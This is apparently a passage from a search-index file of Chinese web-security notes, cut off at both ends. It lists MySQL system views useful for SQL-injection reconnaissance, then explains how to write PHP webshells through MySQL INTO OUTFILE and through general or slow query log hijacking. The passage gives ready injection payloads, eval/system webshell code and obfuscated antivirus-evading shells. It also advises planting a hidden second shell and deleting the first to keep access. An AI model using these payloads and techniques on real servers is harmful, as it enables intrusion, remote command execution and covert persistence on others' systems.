Only<pre><code>sys.io_global_by_file_by_bytes\ninformation_schema.PARTITIONS\ninformation_schema.KEY_COLUMN_USAGE\nperformance_schema.events_statements_summary_by_digest\nperformance_schema.file_instances\nperformance_schema.file_summary_by_instance\nperformance_schema.file_instances\nsys.schema_index_statistics\nsys.schema_object_overview\nsys.schema_tables_with_full_table_scans\nsys.schema_table_statistics\nsys.schema_table_statistics_with_buffer\nsys.statements_with_errors_or_warnings\nsys.statements_with_full_table_scans\nsys.statements_with_runtimes_in_95th_percentile\nsys.statements_with_sorting\nsys.statements_with_temp_tables\nsys.statement_analysis\n</code></pre>"},{"location":"WEB/others/information_schema/#information_schema_3","title":"information_schema","text":"<p><code>schemata</code>, <code>columns</code> , <code>tables</code>\u8fd9\u51e0\u4e2a\u8868\u5c31\u4e0d\u5fc5\u591a\u8bf4\u4e86\uff0c\u6807\u51c6\u7528\u6cd5</p> <p>\u53e6\u5916\u53d1\u73b0\u51e0\u4e2a\u6709\u610f\u601d\u7684\u8868<code>INNODB_FT_DEFAULT_STOPWORD</code>\u548c<code>time_zone_transition</code></p>"},{"location":"WEB/others/information_schema/#information_schemapartitions","title":"information_schema.PARTITIONS","text":"<p>\u89c6\u56fe\u6709\u5168\u90e8\u7684\u5e93\u540d\u8868\u540d</p>"},{"location":"WEB/others/information_schema/#information_schemakey_column_usage","title":"information_schema.KEY_COLUMN_USAGE","text":"<p>\u89c6\u56fe\u6709\u5168\u90e8\u7684\u5e93\u540d\u8868\u540d\u548c\u5217\u540d</p>"},{"location":"WEB/others/information_schema/#performance_schema","title":"performance_schema","text":""},{"location":"WEB/others/information_schema/#performance_schemaevents_statements_summary_by_digest","title":"performance_schema.events_statements_summary_by_digest","text":"<p>\u6709\u5386\u53f2\u67e5\u8be2\u8bb0\u5f55</p>"},{"location":"WEB/others/information_schema/#performance_schemafile_instances","title":"performance_schema.file_instances","text":"<p>\u6709\u5168\u90e8\u8868\u7684\u5b58\u653e\u6587\u4ef6\uff0c\u4e5f\u76f8\u5f53\u4e8e\u5168\u90e8\u5e93\u540d\u4e86\u8868\u540d</p>"},{"location":"WEB/others/information_schema/#performance_schemafile_summary_by_instance","title":"performance_schema.file_summary_by_instance","text":""},{"location":"WEB/others/information_schema/#performance_schemafile_instances_1","title":"performance_schema.file_instances","text":"<p>performance_schema.file_summary_by_instance \u548c performance_schema.file_instances \u6709\u5168\u90e8\u8868\u7684\u5b58\u653e\u6587\u4ef6\uff0c\u76f8\u5f53\u4e8e\u5168\u90e8\u5e93\u540d\u8868\u540d</p>"},{"location":"WEB/others/information_schema/#sys","title":"sys","text":"<p>\u8fd9\u91cc\u9762\u5f88\u591a\u90fd\u662f\u57fa\u4e8e\u5176\u4ed6\u8868\u7684\u89c6\u56fe\uff0c\u6709\u5f88\u591a\u89c6\u56fe\u7528\u4e8e\u5206\u6790\u6267\u884c\u8bed\u53e5\u6240\u4ee5\u6709\u597d\u51e0\u4e2a\u89c6\u56fe\u53ef\u4ee5\u7528\u4e8e\u67e5\u770b\u5f53\u524d\u7684\u67e5\u8be2\u8bed\u53e5\u65b9\u4fbf\u77e5\u9053\u67e5\u8be2\u7684\u5173\u952e\u4fe1\u606f\u3002</p>"},{"location":"WEB/others/information_schema/#sysio_global_by_file_by_bytes","title":"sys.io_global_by_file_by_bytes","text":"<p>\u901a\u8fc7 file \u5b57\u6bb5\u5f97\u5230\u5e93\u540d\u8868\u540d\uff0c\u800c\u4e14\u5f88\u9f50\u5168</p>"},{"location":"WEB/others/information_schema/#sysschema_index_statistics","title":"sys.schema_index_statistics","text":"<p>\u89c6\u56fe\u6709\u90e8\u5206\u8868\u540d\u5b57\u6bb5\u540d</p>"},{"location":"WEB/others/information_schema/#sysschema_object_overview","title":"sys.schema_object_overview","text":"<p>\u6709\u5168\u90e8\u5e93\u540d\u548c\u5e93\u91cc\u9762\u5168\u90e8\u8868\u7684\u5b57\u6bb5\u6570\u4e2a\u6570</p>"},{"location":"WEB/others/information_schema/#sysschema_tables_with_full_table_scans","title":"sys.schema_tables_with_full_table_scans","text":"<p>\u6709\u90e8\u5206\u6211\u4eec\u5e93\u540d</p>"},{"location":"WEB/others/information_schema/#sysschema_table_statistics","title":"sys.schema_table_statistics","text":""},{"location":"WEB/others/information_schema/#sysschema_table_statistics_with_buffer","title":"sys.schema_table_statistics_with_buffer","text":"<p>sys.schema_table_statistics \u548c sys.schema_table_statistics_with_buffer \u6709\u5168\u90e8\u81ea\u5efa\u8868\u7684\u5e93\u540d\u8868\u540d</p>"},{"location":"WEB/others/information_schema/#sysstatements_with_errors_or_warnings","title":"sys.statements_with_errors_or_warnings","text":"<p>\u6709\u5168\u90e8\u6267\u884c\u51fa\u9519\u7684\u547d\u4ee4\u8bed\u53e5\u540c\u65f6\u6709\u4e0e\u8be5\u8bed\u53e5\u76f8\u5173\u7684\u6570\u636e\u5e93</p>"},{"location":"WEB/others/information_schema/#sysstatements_with_full_table_scans","title":"sys.statements_with_full_table_scans","text":"<p>\u6709\u626b\u63cf\u6574\u4e2a\u8868\u7684\u6267\u884c\u8bed\u53e5, \u540c\u65f6\u6709\u76f8\u5173\u7684\u6570\u636e\u5e93\u540d</p>"},{"location":"WEB/others/information_schema/#sysstatements_with_runtimes_in_95th_percentile","title":"sys.statements_with_runtimes_in_95th_percentile","text":"<p>\u6709\u90e8\u5206\u67e5\u8be2\u8bed\u53e5, \u4f46\u662f\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6\u624d\u56de\u5230\u8fd9\u91cc\u6211\u4e5f\u4e0d\u77e5\u9053, \u521a\u521a\u6267\u884c\u7684\u6709\u7279\u5f81\u7684\u6d4b\u8bd5\u8bed\u53e5\u5728\u8fd9\u91cc\u6211\u53ea\u627e\u5230\u4e86\u4e00\u6761</p>"},{"location":"WEB/others/information_schema/#sysstatements_with_sorting","title":"sys.statements_with_sorting","text":""},{"location":"WEB/others/information_schema/#sysstatements_with_temp_tables","title":"sys.statements_with_temp_tables","text":""},{"location":"WEB/others/information_schema/#sysstatement_analysis","title":"sys.statement_analysis","text":"<p>sys.statements_with_sorting \u548c sys.statements_with_temp_tables \u4ee5\u53ca sys.statement_analysis \u8fd9\u4e09\u4e2a\u89c6\u56fe\u4e2d\u6709\u5f88\u591a\u67e5\u8be2\u8bed\u53e5\u8bb0\u5f55\u4f46\u662f\u5728\u6bcf\u4e2a\u89c6\u56fe\u4e2d\u6211\u90fd\u6ca1\u6709\u627e\u5230\u6211\u6267\u884c\u7684\u6d4b\u8bd5\u8bed\u53e5, \u4e0d\u77e5\u9053\u9700\u8981\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6\u624d\u56de\u5230\u8fd9\u91cc, \u4e0d\u8fc7\u4e5f\u8fd8\u662f\u8bb0\u5f55\u4e00\u4e0b\u5427</p> <p>\u5728 sys.io_global_by_file_by_bytes \u548c sys.io_global_by_file_by_latency \u80fd\u627e\u5230\u5168\u90e8\u7684\u5e93\u540d\u548c\u8868\u540d</p>"},{"location":"WEB/others/information_schema/#tips","title":"Tips","text":"<p>\u6211\u8fd9\u91cc\u4f7f\u7528\u7684\u662f Mysql5.7.26 \u7248\u672c\u7684\uff0c\u4f46\u662f\u5f88\u591a\u73af\u5883\u7528\u7684\u90fd\u662f 8.X \u7248\u672c\u7684\u6240\u4ee5\u8fd9\u4e2a\u5c31\u53ea\u5f53\u4e00\u4e2a\u53c2\u8003\uff0c\u5728 8.X \u7248\u672c\u4e2d\u80af\u5b9a\u6709\u4e00\u4e9b\u53d8\u5316\uff0c\u4f46\u662f\u5728\u8fd9\u91cc\u6211\u5c31\u4e0d\u53bb\u627e\u4e86\uff0c\u611f\u5174\u8da3\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u81ea\u5df1\u53bb\u627e\u4e00\u4e0b 8.X \u7684\u3002</p>"},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/","title":"Mysql\u5411\u65e5\u5fd7\u6587\u4ef6\u5199webshell","text":""},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/#mysqlwebshell","title":"mysql\u5982\u4f55\u5411\u65e5\u5fd7\u6587\u4ef6\u5199webshell\u8fdb\u884c\u5229\u7528","text":"<p>Webshell\u8bf4\u660e\uff1a</p> <p>Webshell\u662f\u4e00\u79cd\u6076\u610f\u4ee3\u7801\uff0c\u901a\u5e38\u4ee5\u811a\u672c\u6587\u4ef6\u7684\u5f62\u5f0f\u5b58\u5728\uff0c\u53ef\u4ee5\u5728\u53d7\u653b\u51fb\u7684 Web \u670d\u52a1\u5668\u4e0a\u6267\u884c\u547d\u4ee4\u3001\u64cd\u7eb5\u6587\u4ef6\u7cfb\u7edf\u3001\u7a83\u53d6\u654f\u611f\u4fe1\u606f\u7b49\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u5c06 Webshell \u6ce8\u5165\u5230\u76ee\u6807\u670d\u52a1\u5668\u4e0a\uff0c\u4ee5\u83b7\u53d6\u975e\u6cd5\u8bbf\u95ee\u6743\u9650\u3002</p> <p>MySQL \u65e5\u5fd7\u6587\u4ef6\u8bf4\u660e\uff1a</p> <p>MySQL \u7684\u65e5\u5fd7\u6587\u4ef6\u662f\u7528\u4e8e\u8bb0\u5f55\u6570\u636e\u5e93\u670d\u52a1\u5668\u6d3b\u52a8\u548c\u4e8b\u4ef6\u7684\u91cd\u8981\u7ec4\u6210\u90e8\u5206\uff0c\u8fd9\u4e9b\u65e5\u5fd7\u6587\u4ef6\u5bf9\u4e8e\u6545\u969c\u6392\u9664\u3001\u6027\u80fd\u4f18\u5316\u548c\u5b89\u5168\u5ba1\u8ba1\u975e\u5e38\u6709\u7528\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cMySQL \u7684\u65e5\u5fd7\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e\u670d\u52a1\u5668\u7684\u7279\u5b9a\u76ee\u5f55\u4e2d\u3002\u3002\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cMySQL \u4f1a\u751f\u6210\u4ee5\u4e0b\u51e0\u79cd\u7c7b\u578b\u7684\u65e5\u5fd7\u6587\u4ef6\uff1a</p> <ol> <li>\u67e5\u8be2\u65e5\u5fd7\uff08Query Log\uff09\uff1a\u8bb0\u5f55\u6240\u6709\u53d1\u5f80 MySQL \u670d\u52a1\u5668\u7684\u67e5\u8be2\u8bed\u53e5\u3002\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e MySQL \u7684\u9009\u9879\u6765\u542f\u7528\u6216\u7981\u7528\u67e5\u8be2\u65e5\u5fd7\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u901a\u8fc7\u6ce8\u5165\u6076\u610f\u67e5\u8be2\u8bed\u53e5\u6765\u5728\u65e5\u5fd7\u4e2d\u63d2\u5165 Webshell\u3002</li> <li>\u9519\u8bef\u65e5\u5fd7\uff08Error Log\uff09\uff1a\u8bb0\u5f55 MySQL \u670d\u52a1\u5668\u9047\u5230\u7684\u9519\u8bef\u548c\u5f02\u5e38\u60c5\u51b5\u3002\u9519\u8bef\u65e5\u5fd7\u5bf9\u4e8e\u6545\u969c\u6392\u9664\u548c\u5b89\u5168\u5ba1\u8ba1\u975e\u5e38\u6709\u7528\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u901a\u8fc7\u5229\u7528\u670d\u52a1\u5668\u9519\u8bef\u6765\u89e6\u53d1\u5f02\u5e38\u884c\u4e3a\uff0c\u5e76\u5728\u9519\u8bef\u65e5\u5fd7\u4e2d\u7559\u4e0b Webshell\u3002</li> <li>\u6162\u67e5\u8be2\u65e5\u5fd7\uff08Slow Query Log\uff09\uff1a\u8bb0\u5f55\u6267\u884c\u65f6\u95f4\u8d85\u8fc7\u9884\u5b9a\u4e49\u9608\u503c\u7684\u67e5\u8be2\u8bed\u53e5\u3002\u6162\u67e5\u8be2\u65e5\u5fd7\u7528\u4e8e\u6027\u80fd\u4f18\u5316\u548c\u67e5\u8be2\u5206\u6790\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u901a\u8fc7\u6784\u9020\u590d\u6742\u7684\u67e5\u8be2\u8bed\u53e5\u6765\u4f7f\u5176\u88ab\u8bb0\u5f55\u5728\u6162\u67e5\u8be2\u65e5\u5fd7\u4e2d\uff0c\u5e76\u5728\u5176\u4e2d\u63d2\u5165 Webshell\u3002</li> </ol>"},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/#outfile","title":"\u4f7f\u7528outfile\u65b9\u6cd5\uff1a","text":"Text Only<pre><code>select '&lt;?php @eval($_POST[1]);?&gt;' into outfile 'D:/shell.php'\n</code></pre> <p>\u6210\u529f\u5411mysql\u5199\u5165webshell\u6761\u4ef6\uff08\u81f3\u5c11\uff09</p> <ol> <li>\u6570\u636e\u5e93\u7684\u5f53\u524d\u7528\u6237\u4e3aROOT\u6216\u62e5\u6709FILE\u6743\u9650\uff1b\uff08FILE\u6743\u9650\u6307\u7684\u662f\u5bf9\u670d\u52a1\u5668\u4e3b\u673a\u4e0a\u6587\u4ef6\u7684\u8bbf\u95ee\uff09 </li> <li>\u77e5\u9053\u7f51\u7ad9\u76ee\u5f55\u7684\u7edd\u5bf9\u8def\u5f84\uff1b </li> <li>PHP\u7684GPC\u53c2\u6570\u4e3aoff\u72b6\u6001\uff1b </li> <li>MySQL\u4e2d\u7684secure_file_priv\u53c2\u6570\u4e0d\u80fd\u4e3aNULL\u72b6\u6001\u3002</li> </ol> <p>secure_file_priv</p> <p>secure-file-priv\u662f\u4e00\u4e2a\u7cfb\u7edf\u53d8\u91cf\uff0c\u5bf9\u4e8e\u6587\u4ef6\u8bfb/\u5199\u529f\u80fd\u8fdb\u884c\u9650\u5236\u3002</p> <p>secure_file_priv\u662f\u7528\u6765\u9650\u5236load dumpfile\u3001into outfile\u3001load_file()\u51fd\u6570\u5728\u54ea\u4e2a\u76ee\u5f55\u4e0b\u62e5\u6709\u4e0a\u4f20\u548c\u8bfb\u53d6\u6587\u4ef6\u7684\u6743\u9650\u3002\u5982\u4e0b\u5173\u4e8esecure_file_priv\u7684\u914d\u7f6e\u4ecb\u7ecd</p> <ol> <li>secure_file_priv\u7684\u503c\u4e3anull \uff0c\u8868\u793a\u9650\u5236mysqld \u4e0d\u5141\u8bb8\u5bfc\u5165|\u5bfc\u51fa\uff0c\u610f\u5473\u7740\u901a\u8fc7outfile\u65b9\u6cd5\u5199\u5165WebShell\u662f\u65e0\u6cd5\u6210\u529f\u7684\uff0c\u4f46\u662f\u901a\u8fc7\u5bfc\u51fa\u65e5\u5fd7\u7684\u65b9\u6cd5\u662f\u53ef\u4ee5\u7684\u3002</li> <li>\u5f53secure_file_priv\u7684\u503c\u4e3a/tmp/\uff08\u5177\u4f53\u6587\u4ef6\u8def\u5f84\uff09 \uff0c\u8868\u793a\u9650\u5236mysqld \u7684\u5bfc\u5165|\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728/tmp/\u76ee\u5f55\u4e0b</li> <li>\u5f53secure_file_priv\u7684\u503c\u6ca1\u6709\u5177\u4f53\u503c\u65f6\uff0c\u8868\u793a\u4e0d\u5bf9mysqld \u7684\u5bfc\u5165|\u5bfc\u51fa\u505a\u9650\u5236</li> </ol> <p>\u6ce8\uff1a5.5.53\u672c\u8eab\u53ca\u4e4b\u540e\u7684\u7248\u672c\u9ed8\u8ba4\u503c\u4e3aNULL\uff0c\u4e4b\u524d\u7684\u7248\u672c\u65e0\u5185\u5bb9\u3002</p> <p>\u4e09\u79cd\u65b9\u6cd5\u67e5\u770b\u5f53\u524dsecure-file-priv\u7684\u503c\uff1a</p> <p>select @@secure_file_priv; select @@global.secure_file_priv; show variables like \u201csecure_file_priv\u201d; \u4fee\u6539\uff1a</p> <p>\u901a\u8fc7\u4fee\u6539my.ini\u6587\u4ef6\uff0c\u6dfb\u52a0\uff1asecure-file-priv= \u542f\u52a8\u9879\u6dfb\u52a0\u53c2\u6570\uff1amysqld.exe --secure-file-priv=</p> <p>Outfile\u65b9\u6cd5\u5176\u5b9e\u662fMysql\u63d0\u4f9b\u7684\u4e00\u4e2a\u7528\u6765\u5199\u5165\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u5199\u5165\u7684\u6587\u4ef6\u5185\u5bb9\u4ee5\u53ca\u6587\u4ef6\u7684\u4fdd\u5b58\u8def\u5f84\u65f6\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u4f20\u5165WebShell\u7684\u76ee\u7684\u3002\u5f53\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528union\u67e5\u8be2\u65f6\uff0c\u6211\u4eec\u6784\u9020\u4e00\u4e2a\u5982\u4e0b\u8bed\u53e5\uff0c\u5c31\u53ef\u4ee5\u8fbe\u5230\u6548\u679c\uff1a</p> Text Only<pre><code>Union select \u201c\u8fd9\u91cc\u662fWebShell\u201d into outfile \u201cWeb\u76ee\u5f55\u201d\uff1b\n</code></pre> <p>\u5f53\u6211\u4eec\u65e0\u6cd5\u4f7f\u7528union\u65f6\uff0c\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u5b9e\u73b0\uff08\u5229\u7528\u5206\u9694\u7b26\u5199\u5165\uff09\uff1a</p> Text Only<pre><code>?id=1 INTO OUTFILE '\u7269\u7406\u8def\u5f84' lines terminatedby \uff08\u8fd9\u91cc\u662fWebShell\uff09#\n?id=1 INTO OUTFILE '\u7269\u7406\u8def\u5f84' fields terminatedby \uff08\u8fd9\u91cc\u662fWebShell\uff09# \n?id=1 INTO OUTFILE'\u7269\u7406\u8def\u5f84'columns terminatedby \uff08\u8fd9\u91cc\u662fWebShell\uff09# \n?id=1 INTO OUTFILE '\u7269\u7406\u8def\u5f84' lines startingby \uff08\u8fd9\u91cc\u662fWebShell\uff09#\n</code></pre>"},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/#sqli-labsoutfile","title":"\u5148\u770b\u770bsqli-labs\u7b2c\u4e03\u5173\u7684\u7b14\u8bb0\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528outfile\u65b9\u6cd5\uff1a","text":"Text Only<pre><code>?id=1'))UNION SELECT 1,2,3 into outfile \"D:\\\\uuu.txt\"--+\n</code></pre> <p>\u521a\u5f00\u59cb\u8fd9\u513f\u4e00\u76f4\u4e0d\u884c\uff0c\u786c\u76d8\u4e0a\u51fa\u73b0\u4e0d\u4e86uuu.txt\uff0c\u539f\u56e0\u662f\u81ea\u5df1\u7684mysql\u8bbe\u7f6e\u95ee\u9898\u3002</p> <p>\u5728MySQL\u4e2d\uff0coutfile\u53ef\u4ee5\u7528\u6765\u8f93\u51fa\u4e00\u4e2a\u6587\u4ef6\u3002\u4f46\u662f\u60f3\u8981\u6267\u884c\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u5c31\u5fc5\u987b\u8981\u5f00\u542f\u6587\u4ef6\u5199\u5165\u7684\u6743\u9650\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u6267\u884c\uff1a<code>show variables like '%secure%';</code>\u6765\u67e5\u770b\uff1a\u53d1\u73b0<code>secure_file_priv</code>\u7684 value \u503c\u662f NULL\uff0c\u90a3\u4e48\u8fd9\u4ee3\u8868\u6b64\u65f6\u6587\u4ef6\u5199\u5165\u7684\u6743\u9650\u662f\u5173\u95ed\u7684\uff0c\u90a3\u6211\u4eec\u9700\u8981\u5199\u5165\u8f93\u51fa\u6587\u4ef6\u7684\u4fdd\u5b58\u8def\u5f84\u6765\u5f00\u542f\u5b83\u3002</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u6765\u5230MySQL\u7684\u6839\u76ee\u5f55\u4e0b\uff0c\u4f1a\u770b\u5230\u4e00\u4e2amy.ini\u7684\u6587\u4ef6\u3002</p> <p>\u6253\u5f00my.ini\u6587\u4ef6\uff0c\u6dfb\u52a0<code>secure_file_priv</code>\u4ee5\u53ca\u4ed6\u6240\u5bf9\u5e94\u7684\u53c2\u6570\uff1a\uff08\u6211\u5199\u7684\u662f<code>secure_file_priv='D://'</code>\uff09</p> Text Only<pre><code>\u5728linux\u4e0b\u53ef\u5728/etc/my.cnf\u7684[mysqld]\u91cc\u9762\uff0c\u6dfb\u52a0secure_file_priv=\n</code></pre> <p>\u6ce8\u610f\uff1a\u8def\u5f84\u7684\u659c\u6760\u9700\u8981\u91c7\u7528//\u9700\u8981\u591a\u52a0\u4e00\u4e2a\u659c\u6760\u6765\u8f6c\u4e49\u5b57\u7b26\uff0c\u5176\u6b21\uff0c\u56e0\u4e3aC\u76d8\u7684\u6743\u9650\u95ee\u9898\uff0c\u8bf7\u4e0d\u8981\u628a\u8def\u5f84\u5199\u5230C\u76d8\u4e0a\u3002\u3010\u5f00\u59cb\u6211\u6ca1\u6709\u6ce8\u610f\u8fd9\u4e00\u70b9\u5bfc\u81f4sql\u8bed\u53e5\u4e00\u76f4\u62a5\u9519\uff0c\u5f88\u5934\u75bc\u3011</p> <p>\u4e4b\u540e\u6211\u4eec\u91cd\u542f MySQL\u670d\u52a1\uff1a</p> <p>\u6700\u540e\u91cd\u590d\u521a\u624d\u7684 sql \u8bed\u53e5<code>show variables like '%secure%';</code> \u6765\u67e5\u770b\u662f\u5426\u4fee\u6539\u6210\u529f\uff1a\u53d1\u73b0\u5df2\u7ecf\u51fa\u73b0\u8def\u5f84\u4e86\u3002</p> <p>\u90a3\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c<code>outfile</code>\u6765\u8f93\u51fa\u6587\u4ef6\u5230 D\u76d8\u7684\u4efb\u610f\u4f4d\u7f6e\u4e86\u3002</p> Text Only<pre><code>my.ini\u6587\u4ef6\u662fMySQL\u6570\u636e\u5e93\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u7a0b\u5e8f\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5b83\u53ef\u4ee5\u7528\u4e8e\u8bbe\u7f6eMySQL\u7684\u57fa\u672c\u8fd0\u884c\u53c2\u6570\u3001\u5b89\u5168\u6027\u3001\u7f13\u5b58\u3001\u65e5\u5fd7\u8bb0\u5f55\u7b49\u65b9\u9762\u7684\u53c2\u6570\u3002\n</code></pre> <p>\u5728sql\u6f0f\u6d1e\u4e2d\u53ef\u4ee5\u4f7f\u7528file\u7cfb\u5217\u51fd\u6570</p> <p>load_file()  \uff1a\u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6 into outfile \uff1a\u5c06\u67e5\u8be2\u7684\u6570\u636e\u5199\u5165\u6587\u4ef6\u4e2d into dumpfile\uff1a\u5c06\u67e5\u8be2\u7684\u6570\u636e\u5199\u5165\u6587\u4ef6\u4e2d(\u53ea\u80fd\u5199\u5165\u4e00\u884c\u6570\u636e)</p> Text Only<pre><code>secure_file_prive=null //\u9650\u5236mysqld \u4e0d\u5141\u8bb8\u5bfc\u5165\u5bfc\u51fa\nsecure_file_priv=/path/  //\u9650\u5236mysqld\u7684\u5bfc\u5165\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728\u9ed8\u8ba4\u7684/path/\u76ee\u5f55\u4e0b\nsecure_file_priv=\u2019\u2019  //\u4e0d\u5bf9mysqld \u7684\u5bfc\u5165 \u5bfc\u51fa\u505a\u9650\u5236\n</code></pre> <p>outfile\u51fd\u6570\u53ef\u4ee5\u5bfc\u51fa\u591a\u884c\uff0c\u800cdumpfile\u53ea\u80fd\u5bfc\u51fa\u4e00\u884c\u6570\u636e outfile\u51fd\u6570\u5728\u5c06\u6570\u636e\u5199\u5230\u6587\u4ef6\u91cc\u65f6\u6709\u7279\u6b8a\u7684\u683c\u5f0f\u8f6c\u6362\uff0c\u800cdumpfile\u5219\u4fdd\u6301\u539f\u6570\u636e\u683c\u5f0f</p> <p>\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7``</p> Text Only<pre><code>\u8054\u5408\uff1a\n?id=-1')) union select version(),database(),user() into outfile \"D:\\\\uuu.txt\" --+\n\n\u975e\u8054\u5408\uff1a\n?id=1')) into outfile \"D:\\\\uuu.txt\" fields terminated by '' --+\n</code></pre> <p>\u6765\u4f7f\u5f97\u6240\u9700\u4fe1\u606f\u8f93\u51fa\u5230 uuu.txt</p> <p>\u6ce8\u610f\uff1a\u50a8\u5b58\u7684\u6587\u4ef6\u8def\u5f84uuu.txt\u4e5f\u8981\u672c\u8eab\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\u624d\u53ef\u4ee5\u3002</p> <p>\u6ce8\u610f\uff1a\u95ed\u5408\u6761\u4ef6\u662f'))\uff0c\u4e0d\u7136\u4e5f\u4e0d\u884c</p>"},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/#log","title":"\u57fa\u4e8elog\u65e5\u5fd7\u5199\u5165\u6cd5(\u5168\u5c40\u65e5\u5fd7)","text":"<p>\u6240\u4ee5<code>mysql</code>\u5728 my.ini \u4e2d\u8bbe\u7f6e\u4e86\u5bfc\u51fa\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u65e0\u6cd5\u518d\u4f7f\u7528<code>select \u2026\u2026 into outfile</code>\u6765\u5199\u5165\u4e00\u53e5\u8bdd</p> <p>\u6b64\u65f6\u5728 mysql \u6587\u4ef6\u5939\u4e0b\u7684 my.ini \u4e2d\u53ef\u4ee5\u8bbe\u7f6e\u5230\u5904\u8def\u5f84\uff0c\u4f46\u662f\u5728\u62ff shell \u65f6\uff0c\u4e0d\u53ef\u80fd\u53bb\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 mysql \u7684 log \u6587\u4ef6\u6765\u83b7\u53d6 webshell</p> <ol> <li>\u6211\u4eec\u9996\u5148\u8fdb\u5165SQL\u73af\u5883\uff0c\u6267\u884c\u4ee5\u4e0bSQL\u8bed\u53e5\uff1a</li> </ol> SQL<pre><code>show variables like \"%general%\";\n</code></pre> <ol> <li> <p>\u5982\u679c <code>general_log</code>\u662fOFF\uff0c\u5219\u9700\u8981\u6267\u884c<code>set GLOBAL general_log='ON';</code>\uff08\u5f00\u542f\u65e5\u5fd7\u529f\u80fd\uff09</p> </li> <li> <p>\u63a5\u4e0b\u6765\u8bbe\u7f6e\u65e5\u5fd7\u5b58\u50a8\u8def\u5f84<code>SET GLOBAL general_log_file='C:/phpStudy/www/xxx.php'</code></p> </li> <li> <p>\u6700\u540e\u6267\u884csql\u8bed\u53e5,\u5199\u5165\u65e5\u5fd7\u6587\u4ef6<code>select \"&lt;?php system($_GET[a]);?&gt;\"</code></p> </li> </ol> Text Only<pre><code>\u514d\u6740shell,eval\u65b9\u5f0f\nmysql&gt; select \"&lt;?php $sl = create_function('', @$_REQUEST['klion']);$sl();?&gt;\";\n\n\u522b\u4eba\u7684\u514d\u6740shell,assert&amp;base64encode\u65b9\u5f0f    \nmysql&gt; SELECT \"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['klion']));?&gt;\";     \n</code></pre> <ol> <li>\u5904\u7406\u540e\u4e8b\uff1a</li> </ol> <p>\u5e72\u5b8c\u6d3b\u513f\u4ee5\u540e\u52a1\u5fc5\u8bb0\u5f97\u628a\u914d\u7f6e\u6062\u590d\u539f\u72b6\uff08\u4e0d\u7136,\u76ee\u6807\u7ad9\u5982\u679c\u8bbf\u95ee\u91cf\u6bd4\u8f83\u5927,\u65e5\u5fd7\u6587\u4ef6\u53ef\u80fd\u4f1a\u77ac\u95f4\u66b4\u589e\u8fdeshell\u65f6\u4f1a\u5de8\u5361\uff09\uff0c\u62ff\u5230shell\u8bb0\u5f97\u9a6c\u4e0a\u518d\u4f20\u4e00\u4e2ashell\uff08[\u653e\u7684\u9690\u853d\u70b9\uff09\uff0c\u7136\u540e\u518d\u901a\u8fc7\u65b0\u7684shell\u628a\u6700\u5f00\u59cb\u8fd9\u4e2ashell\u5220\u6389\uff0c\u8c28\u614e\u4e00\u70b9\uff0c\u8d77\u7801\u4e0d\u4f1a\u8ba9\u4f60\u7684shell\u6389\u7684\u90a3\u4e48\u5feb\u3002</p> <p><code>set global general_log = off;</code></p>"},{"location":"WEB/others/mysql%E5%90%91%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%86%99webshell/#log_1","title":"\u57fa\u4e8elog\u65e5\u5fd7\u5199\u5165\u6cd5(\u6162\u67e5\u8be2\u65e5\u5fd7)","text":"<ol> <li>\u67e5\u770b\u6162\u67e5\u8be2\u65e5\u5fd7\u5f00\u542f\u60c5\u51b5<code>show variables like '%slow_query_log%';</code></li> <li>\u5f00\u542f\u6162\u67e5\u8be2\u65e5\u5fd7<code>set global slow_query_log=1;</code></li> <li>\u4fee\u6539\u65e5\u5fd7\u6587\u4ef6\u5b58\u50a8\u7684\u7edd\u5bf9\u8def\u5f84<code>set global slow_query_log_file='D:/shell.php';</code></li> 